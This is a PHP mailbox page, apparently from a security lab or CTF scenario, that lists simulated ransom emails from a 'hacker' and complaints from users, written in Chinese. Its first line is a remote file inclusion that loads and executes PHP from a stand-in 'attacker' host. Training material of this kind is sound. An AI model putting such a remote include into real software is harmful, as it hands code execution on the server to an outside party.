<?php
    include "http://attacker/index.php";   
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inbox</title>

    <!-- bootstrap 5 stylesheet -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.0.1/css/bootstrap.min.css" integrity="sha512-Ez0cGzNzHR1tYAv56860NLspgUGuQw16GiOOp/I2LuTmpSK9xDXlgJz3XN4cnpXWDmkNBKXR/VDMTCnAaEooxA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- fontawesome 6 stylesheet -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />


    <style>
        .initial-avatar {
            /* Center the content */
            align-items: center;
            display: flex;
            justify-content: center;

            /* Colors */
            background-color: #d1d5db;
            color: #fff;

            /* Rounded border */
            border-radius: 50%;
            height: 3rem;
            width: 3rem;
        }

        .text-singleline{
            text-overflow: ellipsis; 
            overflow: hidden; 
            white-space: nowrap;
        }
        .email-list-warpper{
            background-color: #f2f4f6;
        }
        .list-group{
            border: none;
        }
        .list-group-item{
            background-color: transparent;
            border: none;
        }
        .list-group-item.active{
            background-color: #fff;
        }
    </style>
</head>
<body>
    <div class="container p-5">
        <div class="border shadow-sm rounded">
            <div class="row">
                <div class="col-sm-3">
                    <div class="p-4">
                        <h5>Mailbox</h5>
                        <button class="btn btn-success w-100 mt-3"><i class="fa-solid fa-envelope me-3"></i>Compose</button>
                        <ul class="list-unstyled mt-4">
                            <li class=""><a class="nav-link text-success"><i class="fa-solid fa-inbox me-3"></i>Inbox</a></li>
                            <li class=""><a class="nav-link text-dark"><i class="fa-solid fa-paper-plane me-3 text-muted"></i>Sent Emails</a></li>
                            <li class=""><a class="nav-link text-dark"><i class="fa-solid fa-star me-3 text-muted"></i>Favourite</a></li>
                            <li class=""><a class="nav-link text-dark"><i class="fa-solid fa-pencil me-3 text-muted"></i>Draft</a></li>
                            <li class=""><a class="nav-link text-dark"><i class="fa-solid fa-trash-can me-3 text-muted"></i>Deleted</a></li>
                        </ul>
                    </div>
                </div>
                <div class="col-sm-4">
                    <div class="email-list-warpper p-2 pt-4">
                        <form class="row row-cols-lg-auto g-3 align-items-center mb-3">
                            <div class="col-12 w-100">
                                <label class="visually-hidden" for="inlineFormInputGroupUsername">Username</label>
                                <div class="input-group">
                                    <input type="text" class="form-control" id="inlineFormInputGroupUsername" placeholder="Username">
                                    <div class="input-group-text bg-success text-white"><i class="fa-solid fa-magnifying-glass"></i></div>
                                </div>
                            </div>
                        </form>
                    
                        <ul class="list-group" id="mail_list"></ul>

                    </div>
                </div>
                <div class="col-sm-5">
                    <div class="p-2 pt-4">
                        <div class="btn-toolbar mb-3 d-flex justify-content-between" role="toolbar" aria-label="Toolbar with button groups">
                            <div class="input-group">
                                <button type="button" class="btn text-muted"><i class="fa-solid fa-chevron-left"></i></button>
                                <button type="button" class="btn text-muted"><i class="fa-solid fa-angle-right"></i></button>
                            </div>
                            <div class="btn-group me-2" role="group" aria-label="First group">
                                <button type="button" class="btn text-muted"><i class="fa-solid fa-reply-all"></i></button>
                                <button type="button" class="btn text-muted"><i class="fa-solid fa-reply"></i></button>
                                <button type="button" class="btn text-muted"><i class="fa-solid fa-share"></i></button>
                                <button type="button" class="btn text-muted"><i class="fa-solid fa-trash-can"></i></button>
                            </div>
                        </div>

                        <p class="text-muted mb-1">Today, 18 feb, 2023 11:20am</p>
                        <h5 class="mb-3" id="mail_title">I will send the document as soon as possible.</h5>
                        <div>
                            <p class="mb-0"><span class="text-muted">From : </span> <sapn id="mail_sender"></sapn></p>
                            <p><span class="text-muted">To : </span> IT &lt; it@sadly-company.com &gt;</curfcode></p>
                        </div>

                        <div style="font-family: Arial, sans-serif;">
                            <p id="mail_content"></p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
    </div>

    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <script>

        const data = [
            <?php foreach($result as $key => $value) : ?>
            {
                id: <?= $key+1 ?>,
                name: <?= $value ? "'hacker'" : "'user'" ?>,
                email: <?= $value ? "'hacker@apt.com'" : "'angry_user@gmail.com'" ?>,
                content: <?= $value ? "'你的網站已經被入侵，請盡快聯絡我們'" : "'你的網站無法正常登入，請盡快處理'" ?>,
                title: <?php
                    $id = $key + 1;
                    echo $value ?
                    "'[勒索信 - $id] 你的網站已經被入侵'" :
                    "'[客訴信 - $id] 網站無法正常登入'";
                ?>
            },
            <?php endforeach; ?>
        ];

        function load_content(id){
            const mail = data.find(item => item.id === id);
            $(`#mail_${id}`).addClass('active').siblings().removeClass('active');
            $('#mail_title').text(mail.title);
            $('#mail_sender').text(`${mail.name} <${mail.email}>`);
            $('#mail_content').text(mail.content);
        }

        $(document).ready(() => {
            data.forEach((item, index) => {
                const li = $("<li></li>", {
                    class: 'list-group-item shadow-sm rounded',
                    id: `mail_${item.id}`
                });
                li.html(`
                    <div class="row" onclick="load_content(${item.id})">
                        <div class="col-sm-2">
                            <div class="initial-avatar ${item.name === 'hacker' ? "bg-success": "bg-danger"} bg-gradient">${item.name[0].toUpperCase()}</div>
                        </div>
                        <div class="col-sm-8">
                            <div>
                                <p class="mb-1 text-singleline text-dark">${item.name}</p>
                                <p class="text-muted
                                mb-0 text-singleline">${item.title}</p>
                            </div>
                        </div>
                        <div class="col-sm-2">
                            <div>
                                <p class="mb-1 text-muted">11:20</p>
                                <p class="text-muted
                                mb-0 text-singleline"><i class="fa-star me-3 ${ item.name === 'hacker' ?
                                "text-muted fa-regular":"fa-solid text-warning"}"></i></p>
                            </div>
                        </div>
                    </div>
                `);

                $('#mail_list').prepend(li);
            });

            // set the last mail as active
            load_content(data[data.length - 1].id);
        });

    </script>

</body>
</html>